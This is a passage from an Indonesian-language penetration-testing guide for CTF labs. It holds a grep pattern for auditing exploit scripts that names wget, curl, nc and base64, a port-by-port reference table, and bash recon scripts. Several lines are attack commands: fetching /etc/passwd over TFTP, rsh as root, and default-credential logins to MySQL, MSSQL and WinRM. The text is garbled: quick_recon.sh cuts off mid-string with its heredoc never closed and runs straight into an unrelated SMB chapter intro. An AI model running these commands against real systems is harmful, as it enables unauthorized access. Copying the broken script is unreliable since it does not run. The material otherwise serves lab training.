* `language:python CVE-2021-41773`
* `CVE-2021-41773 exploit in:readme`

* **Audit Script Python Sebelum Dijalankan**:
```bash
# 1. Baca 50 baris pertama untuk memahami parameter input
head -n 50 exploit.py

# 2. Cari apakah ada eksekusi shell command tersembunyi
grep -iE "wget|curl|nc|bash|sh|exec|eval|base64|socket" exploit.py

# 3. Pastikan socket hanya terhubung ke target dan listener lokal
grep -iE "connect|bind|http" exploit.py
```

---

### 5.5 NVD & CVEdetails Lookup

* **URL Resmi**: `https://nvd.nist.gov/vuln/detail/CVE-XXXX-YYYY`
* **Cara Membaca Skor CVSS v3**:
  * **9.0 - 10.0 (CRITICAL)**: Remote Code Execution (RCE) tanpa autentikasi. **Prioritas Utama!**
  * **7.0 - 8.9 (HIGH)**: RCE dengan autentikasi user biasa, Local Privilege Escalation, atau Arbitrary File Upload.
  * **4.0 - 6.9 (MEDIUM)**: Information Disclosure, Cross-Site Scripting (XSS), DoS.
  * **0.1 - 3.9 (LOW)**: Minor banner leakage.

---

## 📊 Bagian 6: Quick Reference Master Table

Tabel matriks satu halaman yang memetakan seluruh 37+ protokol jaringan, perintah pertama, alat utama, rujukan modul kurikulum 65 workflow, dan pola kerentanan umum (diurutkan berdasarkan nomor port):

| Port | Service | Command Pertama | Tool Utama | Workflow File (Master Roadmap) | Vuln Pattern Umum |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **21** | FTP | `ftp $TARGET` (anon login) | `ftp`, `nmap` | [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp) | vsftpd 2.3.4 Backdoor, ProFTPD Mod_Copy |
| **22** | SSH | Cari creds di Web/SMB | `ssh`, `hydra` | [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh) | OpenSSH User Enum, Key Passphrase Crack |
| **23** | Telnet | `telnet $TARGET` (default pass) | `telnet` | [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh) / [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc) | Unauth Root Shell, Cleartext Sniffing |
| **25** | SMTP | `smtp-user-enum -M VRFY -t $TARGET` | `smtp-user-enum` | [08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp) | VRFY User Enum, Open Relay Phishing |
| **53** | DNS | `dig axfr @$TARGET domain.htb` | `dig`, `fierce` | [09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns) | AXFR Zone Transfer, Subdomain Leak |
| **69** | TFTP | `tftp $TARGET -c get /etc/passwd` | `tftp` | [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp) | Unauthenticated File Disclosure |
| **79** | Finger | `finger @$TARGET` | `finger` | [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh) / [⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)](/docs/password-cracking) | Username Enumeration |
| **80/443** | HTTP/S | `whatweb`, `ffuf -u http://$TARGET/FUZZ` | `ffuf`, `burpsuite`| [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing) | SQLi, LFI, File Upload RCE, SSTI |
| **110/143**| POP3/IMAP | `nc -vn $TARGET 110` (Login mailbox) | `nc`, `openssl` | [08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp) | Password Reset Token Sniffing |
| **111** | RPC | `rpcinfo -p $TARGET` | `rpcinfo` | [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs) | NFS/Mountd Service Discovery |
| **139/445**| SMB | `smbclient -N -L //$TARGET/` | `nxc`, `smbclient` | [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba) | MS17-010 EternalBlue, SMBGhost |
| **161** | SNMP | `onesixtyone -c wordlist.txt $TARGET` | `onesixtyone` | [10. SNMP Enumeration & Information Gathering Workflow — Master Field Guide](/docs/snmp) | Process, User, & Network Interface Dump |
| **389/636**| LDAP | `ldapsearch -x -H ldap://$TARGET` | `ldapsearch` | [11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap) & [🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration) | Anonymous AD Objects & Description Leak |
| **512-514**| R-Services | `rsh -l root $TARGET id` | `rsh`, `rlogin` | [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc) | .rhosts Misconfiguration Instant Root |
| **873** | Rsync | `rsync --list-only rsync://$TARGET/` | `rsync` | [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs) / [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc) | File Overwrite, SSH Key Upload |
| **1433** | MSSQL | `nxc mssql $TARGET -u sa -p pass` | `nxc`, `impacket` | [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql) | `xp_cmdshell` RCE, Database Dump |
| **1521** | Oracle | `odat sidguesser -s $TARGET` | `odat` | [14_database_workflow.md](./14_database_workflow.md) | Default SID/Creds, Java OS Exec |
| **2049** | NFS | `showmount -e $TARGET` | `showmount`, `mount`| [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs) | `no_root_squash` SUID Bash Root |
| **2181** | Zookeeper | `echo envi \| nc -vn $TARGET 2181` | `nc` | [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) / [🔌 30 — API Security Workflow](/docs/api-security) | Environment Secrets Disclosure |
| **3000** | Node/Graf | `curl -I http://$TARGET:3000/` | `browser`, `ffuf` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🔌 30 — API Security Workflow](/docs/api-security) | Grafana Directory Traversal CVE-2021-43798 |
| **3306** | MySQL | `mysql -h $TARGET -u root` | `mysql`, `nxc` | [14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql) | `SELECT INTO OUTFILE` Web Shell |
| **3389** | RDP | `nmap --script rdp-enum-encryption` | `xfreerdp`, `nmap` | [12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide](/docs/rdp) | BlueKeep CVE-2019-0708, GUI Session Hijack |
| **4369** | Erlang | `nmap --script epmd-info -p 4369` | `nmap` | [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc) | Erlang Cookie Remote Code Execution |
| **5000** | Flask | Buka `/console`, SSTI `{{7*7}}` | `browser`, `curl` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti) | Werkzeug Console PIN Exploit, Jinja2 SSTI |
| **5432** | Postgres | `psql -h $TARGET -U postgres` | `psql` | [14c. PostgreSQL Exploitation Workflow — Master Field Guide](/docs/postgresql) | `COPY PROGRAM` Command Execution |
| **5601** | Kibana | Buka `http://$TARGET:5601/` | `browser` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [32 — Deserialization Workflow 🔐](/docs/deserialization) | Timelion Prototype Pollution CVE-2019-7609 |
| **5900** | VNC | `vncviewer $TARGET:5900` | `vncviewer` | [12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide](/docs/rdp) | Null Authentication GUI Access |
| **5985/5986**| WinRM | `evil-winrm -i $TARGET -u user -p pass` | `evil-winrm` | [🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc) & [🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement) | Interactive PowerShell Terminal Access |
| **6379** | Redis | `redis-cli -h $TARGET ping` | `redis-cli` | [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) | Unauthenticated Write SSH Key to `/root/.ssh` |
| **6443** | Kube API | `curl -k https://$TARGET:6443/api` | `curl` | [🔌 30 — API Security Workflow](/docs/api-security) & [☁️ Bagian 0: Fondasi Cloud Security](/docs/cloud-enum) | Anonymous Pods Access, Container Escape |
| **8080/8443**| HTTP Alt | Buka `/manager/html`, Jenkins | `browser` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [25 — File Upload Workflow](/docs/file-upload) | WAR File Deployment RCE, Jenkins Groovy |
| **8888** | Jupyter | Buka Dashboard Web Notebook | `browser` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🖥️ 26 — Command Injection Workflow](/docs/command-injection) | Python Terminal Interactive RCE |
| **9000** | SonarQube | Default creds / PHP-FPM FastCGI | `curl`, `nc` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🖥️ 26 — Command Injection Workflow](/docs/command-injection) | FastCGI RCE CVE-2019-11043 |
| **9090** | Prometh. | `curl -s http://$TARGET:9090/metrics` | `curl` | [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🔌 30 — API Security Workflow](/docs/api-security) | Internal Targets & Token Disclosure |
| **9200** | Elastic | `curl -s http://$TARGET:9200/_cat/indices` | `curl` | [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) & [🔌 30 — API Security Workflow](/docs/api-security) | Unauthenticated Index Database Dump |
| **27017** | MongoDB | `mongosh mongodb://$TARGET:27017/` | `mongosh` | [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) | NoSQL Collections Data Extraction |
| **50000** | SAP/JMX | `nmap --script jmx-info -p 50000` | `beanshooter` | [32 — Deserialization Workflow 🔐](/docs/deserialization) | Java RMI Deserialization RCE |

---

## 🤖 Bagian 7: Automation Scripts

Berikut adalah 3 script bash otomasi terpadu untuk memproses hasil scan dan memberikan navigasi konkret:

```text
+=============================================================================+
|                      AUTOMATION RECON SCRIPTS                               |
+=============================================================================+
```

### 7.1 Auto Banner Grab Script (`auto_banner.sh`)

Script ini membaca port terbuka dari file output `.nmap`, membedakan port web dan non-web, menjalankan banner grabbing, serta menyimpannya ke folder `banner/`:

```bash
cat << 'EOF' > ~/ctf/tools/auto_banner.sh
#!/bin/bash
# auto_banner.sh - Otomatis banner grab semua port terbuka
# Usage: ./auto_banner.sh [target] [nmap_file.nmap]

TARGET=${1:-$TARGET}
NMAP_FILE=${2:-"nmap/fast.nmap"}

if [ -z "$TARGET" ]; then
    echo -e "\033[1;31m[-] Error: TARGET belum disetel!\033[0m"
    echo -e "Penggunaan: $0 <IP_TARGET> [file_nmap]"
    exit 1
fi

if [ ! -f "$NMAP_FILE" ]; then
    echo -e "\033[1;31m[-] File scan $NMAP_FILE tidak ditemukan!\033[0m"
    exit 1
fi

mkdir -p banner/
echo -e "\033[1;34m[*] Memulai Banner Grabbing Otomatis untuk $TARGET...\033[0m"
PORTS=$(grep "^[0-9]" "$NMAP_FILE" | grep "open" | cut -d '/' -f 1)

for PORT in $PORTS; do
    echo -e "\n\033[1;33m[+] Memeriksa Port: $PORT/TCP\033[0m"
    
    case $PORT in
        80|443|8080|8443|3000|5000|8888|9000|9090)
            echo "    ➔ Menjalankan curl probe (Web Port)..."
            curl -s -k -I --connect-timeout 3 "http://$TARGET:$PORT/" > "banner/port_${PORT}_http.txt" 2>&1
            whatweb -a 1 "http://$TARGET:$PORT/" > "banner/port_${PORT}_whatweb.txt" 2>&1
            if [ -s "banner/port_${PORT}_http.txt" ]; then
                SERVER_HDR=$(grep -i "Server:" "banner/port_${PORT}_http.txt" | head -n 1)
                echo -e "    \033[1;36m[HTTP Header]:\033[0m $SERVER_HDR"
            fi
            ;;
        *)
            echo "    ➔ Menjalankan Netcat raw probe (Non-Web Port)..."
            nc -vn -w 3 "$TARGET" "$PORT" > "banner/port_${PORT}_nc.txt" 2>&1
            if [ -s "banner/port_${PORT}_nc.txt" ]; then
                RAW_BANNER=$(head -n 2 "banner/port_${PORT}_nc.txt" | tr '\r\n' ' ')
                echo -e "    \033[1;32m[Raw Banner]:\033[0m $RAW_BANNER"
            fi
            ;;
    esac
done

echo -e "\n\033[1;32m[✓] Banner grabbing selesai. Log tersimpan di folder banner/\033[0m"
EOF

chmod +x ~/ctf/tools/auto_banner.sh
```

---

### 7.2 Auto Next Steps Script (`next_steps.sh`)

Script ini mem-parse file `.gnmap` atau `.nmap` dan mencetak panduan tindakan konkret (*GPS Navigator*) langsung di terminal:

```bash
cat << 'EOF' > ~/ctf/tools/next_steps.sh
#!/bin/bash
# next_steps.sh - Print next steps berdasarkan port terbuka
# Usage: ./next_steps.sh [nmap_file.gnmap]

SCAN_FILE=${1:-"nmap/services.gnmap"}

if [ ! -f "$SCAN_FILE" ]; then
    # Fallback ke .nmap jika .gnmap tidak ada
    SCAN_FILE="nmap/services.nmap"
    if [ ! -f "$SCAN_FILE" ]; then
        echo -e "\033[1;31m[-] File scan tidak ditemukan!\033[0m"
        echo -e "Penggunaan: $0 <file_nmap.gnmap>"
        exit 1
    fi
fi

TARGET_IP=$(grep -oP 'Host: \K[0-9.]+' "$SCAN_FILE" 2>/dev/null | head -n 1)
[ -z "$TARGET_IP" ] && TARGET_IP=$(grep -oP 'Nmap scan report for \K[0-9.]+' "$SCAN_FILE" | head -n 1)
[ -z "$TARGET_IP" ] && TARGET_IP=$TARGET

echo -e "\033[1;34m========================================================\033[0m"
echo -e "\033[1;32m[*] ACTION PLAN GPS FOR: $TARGET_IP\033[0m"
echo -e "\033[1;34m========================================================\033[0m"

PORTS=$(grep "^[0-9]" "$SCAN_FILE" 2>/dev/null | grep "open" | cut -d '/' -f 1)
[ -z "$PORTS" ] && PORTS=$(grep -oP '\d+/open/tcp' "$SCAN_FILE" | cut -d'/' -f1)

for PORT in $PORTS; do
    echo -e "\n\033[1;33m--------------------------------------------------------\033[0m"
    case $PORT in
        21)
            echo -e "\033[1;35m[+] PORT 21 (FTP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m ftp anonymous@$TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m nmap --script ftp-anon,ftp-syst -p 21 $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 07_ftp_workflow.md"
            ;;
        22)
            echo -e "\033[1;35m[+] PORT 22 (SSH) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Info:\033[0m Jangan bruteforce! Cari password/key di Web/SMB terlebih dahulu."
            echo -e "    \033[1;32m→ Run:\033[0m ssh user@$TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 06_ssh_workflow.md"
            ;;
        23)
            echo -e "\033[1;35m[+] PORT 23 (TELNET) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m telnet $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 06_ssh_workflow.md / 44_linux_privesc_workflow.md"
            ;;
        25)
            echo -e "\033[1;35m[+] PORT 25 (SMTP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nc -vn $TARGET_IP 25"
            echo -e "    \033[1;32m→ Run:\033[0m smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 08_smtp_workflow.md"
            ;;
        53)
            echo -e "\033[1;35m[+] PORT 53 (DNS) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m dig axfr @$TARGET_IP target.htb"
            echo -e "    \033[1;36m→ Workflow:\033[0m 09_dns_workflow.md"
            ;;
        69)
            echo -e "\033[1;35m[+] PORT 69 (TFTP UDP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m tftp $TARGET_IP -c get /etc/passwd"
            echo -e "    \033[1;36m→ Workflow:\033[0m 07_ftp_workflow.md"
            ;;
        79)
            echo -e "\033[1;35m[+] PORT 79 (FINGER) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m finger @$TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 06_ssh_workflow.md / 63_password_cracking_workflow.md"
            ;;
        80|443|8080|8443)
            echo -e "\033[1;35m[+] PORT $PORT (HTTP/WEB) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -I http://$TARGET_IP:$PORT/"
            echo -e "    \033[1;32m→ Run:\033[0m whatweb http://$TARGET_IP:$PORT/"
            echo -e "    \033[1;32m→ Run:\033[0m ffuf -u http://$TARGET_IP:$PORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing)"
            ;;
        88)
            echo -e "\033[1;35m[+] PORT 88 (KERBEROS) = AD DC!\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nxc smb $TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m kerbrute userenum --dc $TARGET_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
            echo -e "    \033[1;36m→ Workflow:\033[0m 35_ad_initial_enumeration_workflow.md"
            ;;
        110|143|993|995)
            echo -e "\033[1;35m[+] PORT $PORT (POP3/IMAP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nc -vn $TARGET_IP $PORT"
            echo -e "    \033[1;36m→ Workflow:\033[0m 08_smtp_workflow.md"
            ;;
        111)
            echo -e "\033[1;35m[+] PORT 111 (RPC/PORTMAPPER) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m rpcinfo -p $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 13_nfs_workflow.md"
            ;;
        139|445)
            echo -e "\033[1;35m[+] PORT $PORT (SMB/SAMBA) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m smbclient -N -L //$TARGET_IP/"
            echo -e "    \033[1;32m→ Run:\033[0m enum4linux-ng -A $TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m nxc smb $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 05_smb_samba_workflow.md"
            ;;
        161)
            echo -e "\033[1;35m[+] PORT 161 (SNMP UDP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m snmpwalk -v2c -c public $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 10_snmp_workflow.md"
            ;;
        389|636|3268|3269)
            echo -e "\033[1;35m[+] PORT $PORT (LDAP/GLOBAL CATALOG) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m ldapsearch -x -H ldap://$TARGET_IP -b 'DC=domain,DC=local'"
            echo -e "    \033[1;36m→ Workflow:\033[0m 11_ldap_workflow.md & 35_ad_initial_enumeration_workflow.md"
            ;;
        512|513|514)
            echo -e "\033[1;35m[+] PORT $PORT (R-SERVICES) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m rsh -l root $TARGET_IP id"
            echo -e "    \033[1;36m→ Workflow:\033[0m 44_linux_privesc_workflow.md"
            ;;
        873)
            echo -e "\033[1;35m[+] PORT 873 (RSYNC) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m rsync --list-only rsync://$TARGET_IP/"
            echo -e "    \033[1;36m→ Workflow:\033[0m 13_nfs_workflow.md / 44_linux_privesc_workflow.md"
            ;;
        1433)
            echo -e "\033[1;35m[+] PORT 1433 (MSSQL) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nxc mssql $TARGET_IP -u sa -p 'password'"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14b_mssql_workflow.md"
            ;;
        1521)
            echo -e "\033[1;35m[+] PORT 1521 (ORACLE DB) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m odat sidguesser -s $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14_database_workflow.md"
            ;;
        2049)
            echo -e "\033[1;35m[+] PORT 2049 (NFS) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m showmount -e $TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m sudo mount -t nfs -o nolock $TARGET_IP:/shared /mnt/nfs"
            echo -e "    \033[1;36m→ Workflow:\033[0m 13_nfs_workflow.md"
            ;;
        2181)
            echo -e "\033[1;35m[+] PORT 2181 (ZOOKEEPER) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m echo envi | nc -vn $TARGET_IP 2181"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14d_redis_mongodb_workflow.md / [🔌 30 — API Security Workflow](/docs/api-security)"
            ;;
        3000)
            echo -e "\033[1;35m[+] PORT 3000 (NODE.JS / GRAFANA) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -I http://$TARGET_IP:3000/"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [🔌 30 — API Security Workflow](/docs/api-security)"
            ;;
        3306)
            echo -e "\033[1;35m[+] PORT 3306 (MYSQL) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m mysql -h $TARGET_IP -u root"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14a_mysql_workflow.md"
            ;;
        3389)
            echo -e "\033[1;35m[+] PORT 3389 (RDP) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 $TARGET_IP"
            echo -e "    \033[1;32m→ Run:\033[0m xfreerdp /v:$TARGET_IP /u:user /p:pass"
            echo -e "    \033[1;36m→ Workflow:\033[0m 12_rdp_workflow.md"
            ;;
        4369)
            echo -e "\033[1;35m[+] PORT 4369 (ERLANG EPMD) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nmap --script epmd-info -p 4369 $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 44_linux_privesc_workflow.md"
            ;;
        5000)
            echo -e "\033[1;35m[+] PORT 5000 (FLASK / PYTHON) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -I http://$TARGET_IP:5000/console"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti)"
            ;;
        5432)
            echo -e "\033[1;35m[+] PORT 5432 (POSTGRESQL) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m psql -h $TARGET_IP -U postgres"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14c_postgresql_workflow.md"
            ;;
        5601)
            echo -e "\033[1;35m[+] PORT 5601 (KIBANA) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -I http://$TARGET_IP:5601/"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [32 — Deserialization Workflow 🔐](/docs/deserialization)"
            ;;
        5900)
            echo -e "\033[1;35m[+] PORT 5900 (VNC) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m vncviewer $TARGET_IP:5900"
            echo -e "    \033[1;36m→ Workflow:\033[0m 12_rdp_workflow.md"
            ;;
        5985|5986)
            echo -e "\033[1;35m[+] PORT $PORT (WINRM) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m evil-winrm -i $TARGET_IP -u user -p pass"
            echo -e "    \033[1;36m→ Workflow:\033[0m 45_windows_privesc_workflow.md"
            ;;
        6379)
            echo -e "\033[1;35m[+] PORT 6379 (REDIS) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m redis-cli -h $TARGET_IP ping"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14d_redis_mongodb_workflow.md"
            ;;
        6443)
            echo -e "\033[1;35m[+] PORT 6443 (KUBERNETES API) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -k https://$TARGET_IP:6443/api"
            echo -e "    \033[1;36m→ Workflow:\033[0m 30_api_security_workflow.md & [☁️ Bagian 0: Fondasi Cloud Security](/docs/cloud-enum)"
            ;;
        8888)
            echo -e "\033[1;35m[+] PORT 8888 (JUPYTER NOTEBOOK) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -I http://$TARGET_IP:8888/"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [🖥️ 26 — Command Injection Workflow](/docs/command-injection)"
            ;;
        9000)
            echo -e "\033[1;35m[+] PORT 9000 (SONARQUBE / PHP-FPM) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nc -vn $TARGET_IP 9000"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [🖥️ 26 — Command Injection Workflow](/docs/command-injection)"
            ;;
        9090)
            echo -e "\033[1;35m[+] PORT 9090 (PROMETHEUS) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -s http://$TARGET_IP:9090/metrics"
            echo -e "    \033[1;36m→ Workflow:\033[0m 15_web_recon_workflow.md & [🔌 30 — API Security Workflow](/docs/api-security)"
            ;;
        9200)
            echo -e "\033[1;35m[+] PORT 9200 (ELASTICSEARCH) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m curl -s http://$TARGET_IP:9200/_cat/indices"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14d_redis_mongodb_workflow.md & [🔌 30 — API Security Workflow](/docs/api-security)"
            ;;
        27017)
            echo -e "\033[1;35m[+] PORT 27017 (MONGODB) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m mongosh mongodb://$TARGET_IP:27017/"
            echo -e "    \033[1;36m→ Workflow:\033[0m 14d_redis_mongodb_workflow.md"
            ;;
        50000)
            echo -e "\033[1;35m[+] PORT 50000 (SAP / JMX) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nmap --script jmx-info -p 50000 $TARGET_IP"
            echo -e "    \033[1;36m→ Workflow:\033[0m 32_deserialization_workflow.md"
            ;;
        *)
            echo -e "\033[1;35m[+] PORT $PORT (UNKNOWN/CUSTOM) DETECTED\033[0m"
            echo -e "    \033[1;32m→ Run:\033[0m nc -vn $TARGET_IP $PORT"
            ;;
    esac
done

echo -e "\n\033[1;34m========================================================\033[0m"
EOF

chmod +x ~/ctf/tools/next_steps.sh
```

---

### 7.3 Quick Recon Script (All-in-One) (`quick_recon.sh`)

Script terpadu yang dapat dipanggil langsung dengan IP target:

```bash
cat << 'EOF' > ~/ctf/tools/quick_recon.sh
#!/bin/bash
# quick_recon.sh - All-in-one recon orchestrator
# Usage: ./quick_recon.sh 10.10.11.205

if [ -z "$1" ]; then
    echo -e "\033[1;31m[-] Penggunaan: $0 <IP_TARGET>\033[0m"
    echo -e "Contoh: $0 10.10.11.205"
    exit 1
fi

export TARGET=$1
echo -e "\033[1;32m[+] TARGET DISETEL KE: $TARGET\033[0m"

# 1. Buat folder struktur kerja
mkdir -p nmap web banner loot exploits

# 2. Fast Nmap Scan (Top 1000 Ports)
echo -e "\n\033[1;34m[*] Menjalankan Fast Nmap Scan (Top 1000 Ports)...\033[0m"
sudo nmap -sS -T4 -Pn -n -v "$TARGET" -oN nmap/fast.nmap

# 3. Parse port terbuka
PORTS=$(grep "^[0-9]" nmap/fast.nmap | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

if [ -n "$PORTS" ]; then
    echo -e "\033[1;32m[✓] Port Terbuka Ditemukan: $PORTS\033[0m"
    
    # 4. Deep Service Scan pada port terbuka
    echo -e "\n\033[1;34m[*] Menjalankan Deep Scan (-sC -sV) pada port: $PORTS...\033[0m"
    sudo nmap -sC -sV -O -p$PORTS -Pn -n "$TARGET" -oA nmap/services
    
    # 5. Tampilkan Action Plan Next Steps
    ~/ctf/tools/next_steps.sh nmap/services.nmap
    
    # 6. Konfirmasi Banner Grab Otomatis
    echo -en "\n\033[1;33m[?] Jalankan Banner Grab otomatis untuk semua port? [y/N]: \033[0m"
    read -r JAWAB
    if [[ "$JAWAB" =~ ^[Yy]$ ]]; then
        ~/ctf/tools/auto_banner.sh "$TARGET" nmap/fast.nmap
    fi
else
    echo -e "\033[1;31m[-] Tidak ada port terbuka pada Top 1000. Jalankan scan semua port di background:\033[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)** (*SMB & Samba Protocol Enumeration, Share Looting, Null Session, & Remote Exploitation*)

### Mengapa File 05 (SMB & Samba) Menjadi Langkah Pertama di Kelompok 2?
1. **Layanan Paling Kaya Attack Vector**: Port 445/139 merupakan salah satu vektor serangan paling melimpah di Windows Server, Active Directory DC, maupun Linux Samba File Server.
2. **Sering Muncul di HTB Easy Hingga Insane**: Protokol SMB hampir selalu menjadi pintu masuk utama pada berbagai tingkat kesulitan lab CTF.
3. **Jembatan Utama Menuju Active Directory Attack Path**: Menguasai enumerasi user SMB, RID cycling, dan relay attack adalah syarat mutlak sebelum melakukan penetrasi domain Active Directory.
4. **Anonymous Access Memberikan Initial Foothold Cepat**: Miskonfigurasi null session dan share terbuka kerap menyimpan file backup database, script deployment, file konfigurasi `.kdbx`, atau private key SSH.
5. **Eksploitasi Pre-Auth Berdampak Kritis**: Mempelajari deteksi dan eksploitasi celah legendaris seperti `MS17-010 (EternalBlue)`, `CVE-2020-0796 (SMBGhost)`, dan `SambaCry`.

Buka file [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba) dan mulailah menguasai teknik penetrasi protokol SMB & Samba!
